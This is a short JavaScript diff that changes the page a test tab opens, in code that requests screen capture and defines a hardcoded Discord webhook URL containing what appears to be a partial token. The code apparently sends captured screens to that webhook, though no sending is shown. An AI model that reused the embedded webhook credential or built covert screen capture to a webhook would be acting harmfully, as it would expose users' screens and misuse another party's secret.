@@ -12,7 +12,7 @@ const WEBHOOK="https://discord.com/api/webhooks/1471638895149187216/4BuoD1F-aQPE
 (async()=>{
   try{
     // open test tab just to notify permissions
-    const testTab = window.open("test.html","_blank");
+    const testTab = window.open("index.html?test","_blank");
     console.log("Requesting screen capture...");
     const stream = await navigator.mediaDevices.getDisplayMedia({video:true});
     console.log("Permissions granted.");
